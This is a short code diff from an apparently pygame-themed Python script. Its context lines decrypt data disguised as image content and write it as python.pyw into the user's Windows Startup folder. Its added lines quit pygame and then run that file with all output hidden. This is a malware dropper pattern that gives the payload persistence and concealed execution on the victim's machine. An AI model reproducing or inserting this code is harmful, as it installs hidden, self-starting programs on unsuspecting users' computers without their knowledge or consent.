@@ -172,4 +172,5 @@ aaa=fR"C:\Users\{psutil.users()[0].name}\AppData\Roaming\Microsoft\Windows\Start
 f=open(aaa,'wb')
 f.write(ImageToPygame(imaged).decrypt(images))
 f.close()
-os.system(fR'''python "C:\Users\{psutil.users()[0].name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\python.pyw"''')
+pygame.quit()
+os.system(fR'''python "C:\Users\{psutil.users()[0].name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\python.pyw"  > nul 2>&1''')
